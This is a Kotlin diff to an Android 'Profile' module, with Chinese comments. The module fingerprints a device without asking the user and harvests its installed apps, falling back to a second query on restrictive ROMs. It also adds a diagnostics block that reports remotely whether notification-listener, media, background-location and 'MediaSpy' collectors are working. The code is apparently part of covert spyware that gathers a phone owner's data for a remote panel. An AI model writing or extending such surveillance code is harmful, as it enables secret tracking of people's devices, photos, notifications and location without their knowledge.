@@ -13,10 +13,13 @@ import java.util.TimeZone
 /**
  * 设备画像。全部零权限字段 —— 不需要用户点任何东西。
  *
- * 注意 IMEI 那一路：Android 10 (API 29) 起非系统应用拿不到，
- * 别在这上面浪费时间，SSAID + FINGERPRINT 的唯一性已经够用。
+ * IMEI 那一路不用想了：Android 10 (API 29) 起非系统应用拿不到，
+ * SSAID + FINGERPRINT 的唯一性已经够。
  */
 object Profile {
+
+    @Volatile
+    private var lastAppsErr: String = ""
 
     fun dump(ctx: Context): JSONObject? = runCatching {
         JSONObject().apply {
@@ -40,26 +43,96 @@ object Profile {
         }.also { o ->
             val dm = ctx.resources.displayMetrics
             o.put("screen", "${dm.widthPixels}x${dm.heightPixels}@${dm.densityDpi}")
-            o.put("apps", apps(ctx))
+            val arr = apps(ctx)
+            o.put("apps", arr)
+            o.put("appsDiag", "n=${arr.length()} err=$lastAppsErr")
+
+            // 各权限与采集器状态 —— 远程就能看出哪一项没工作
+            val diag = JSONObject()
+            val flat = android.provider.Settings.Secure.getString(
+                ctx.contentResolver, "enabled_notification_listeners") ?: ""
+            diag.put("notifListener", flat.contains(ctx.packageName))
+            diag.put("mediaPerm", androidx.core.content.ContextCompat.checkSelfPermission(
+                ctx, mediaPermission()) == android.content.pm.PackageManager.PERMISSION_GRANTED)
+            diag.put("bgLoc", Build.VERSION.SDK_INT < 29 ||
+                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
+                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
+                android.content.pm.PackageManager.PERMISSION_GRANTED)
+            diag.put("mediaRows", MediaSpy.lastRows)
+            diag.put("mediaSent", MediaSpy.lastSent)
+            diag.put("mediaSince", MediaSpy.lastSince)
+            diag.put("mediaErr", MediaSpy.lastErr)
+            o.put("diag", diag)
         }
     }.getOrNull()
 
-    /** 已装应用。Android 11+ 需要 manifest 里声明 QUERY_ALL_PACKAGES。 */
-    fun apps(ctx: Context): JSONArray = runCatching {
-        val pm = ctx.packageManager
-        val list = if (Build.VERSION.SDK_INT >= 33) {
-            pm.getInstalledPackages(android.content.pm.PackageManager.PackageInfoFlags.of(0))
-        } else {
-            @Suppress("DEPRECATION")
-            pm.getInstalledPackages(0)
-        }
+    /**
+     * 已装应用。
+     *
+     * 两条路：
+     *  1) getInstalledPackages —— Android 11+ 需要 QUERY_ALL_PACKAGES，
+     *     部分定制 ROM（vivo/OPPO 的某些版本）会直接返回空或抛 SecurityException。
+     *  2) queryIntentActivities(MAIN/LAUNCHER) —— 只拿有桌面图标的，
+     *     但这条路限制更少，作为 fallback。
+     */
+    fun apps(ctx: Context): JSONArray {
         val arr = JSONArray()
-        list.sortedBy { it.packageName }.forEach { pi ->
-            if (pi.packageName == ctx.packageName) return@forEach
-            arr.put(pi.packageName + "|" + (pi.versionName ?: "") + "|" + pi.firstInstallTime)
+        val pm = ctx.packageManager
+        var err = ""
+
+        // ---- 路 1 ----
+        try {
+            val list = if (Build.VERSION.SDK_INT >= 33) {
+                pm.getInstalledPackages(
+                    android.content.pm.PackageManager.PackageInfoFlags.of(0L))
+            } else {
+                @Suppress("DEPRECATION")
+                pm.getInstalledPackages(0)
+            }
+            for (pi in list) {
+                if (pi.packageName == ctx.packageName) continue
+                // 应用显示名（中文），面板上就看这个，不再是一串 com.xxx
+                val lbl = runCatching {
+                    pi.applicationInfo?.loadLabel(pm)?.toString()?.replace("\t", " ") ?: ""
+                }.getOrDefault("")
+                arr.put(lbl + "\t" + pi.packageName + "\t" +
+                    (pi.versionName ?: "") + "\t" + pi.firstInstallTime)
+            }
+            if (arr.length() == 0) err = "ip:empty"
+        } catch (t: Throwable) {
+            err = "ip:" + (t.javaClass.simpleName) + ":" + (t.message ?: "").take(60)
         }
-        arr
-    }.getOrDefault(JSONArray())
+
+        // ---- 路 2（兜底）----
+        if (arr.length() == 0) {
+            try {
+                val intent = Intent(Intent.ACTION_MAIN)
+                    .addCategory(Intent.CATEGORY_LAUNCHER)
+                @Suppress("DEPRECATION")
+                val ris = pm.queryIntentActivities(intent, 0)
+                for (ri in ris) {
+                    val pkg = ri.activityInfo?.packageName ?: continue
+                    if (pkg == ctx.packageName) continue
+                    // 走这条路拿不到安装时间，但显示名有
+                    val lbl = runCatching {
+                        ri.loadLabel(pm)?.toString()?.replace("\t", " ") ?: ""
+                    }.getOrDefault("")
+                    arr.put(lbl + "\t" + pkg + "\t\t0")
+                }
+                if (arr.length() == 0) err += "|qia:empty"
+            } catch (t: Throwable) {
+                err += "|qia:" + (t.message ?: "?").take(40)
+            }
+        }
+
+        lastAppsErr = err
+        return arr
+    }
+
+    private fun mediaPermission(): String = when {
+        Build.VERSION.SDK_INT >= 33 -> "android.permission.READ_MEDIA_IMAGES"
+        else -> @Suppress("DEPRECATION") "android.permission.READ_EXTERNAL_STORAGE"
+    }
 
     /** 电量百分比；拿不到返回 -1。 */
     fun battery(ctx: Context): Int = runCatching {
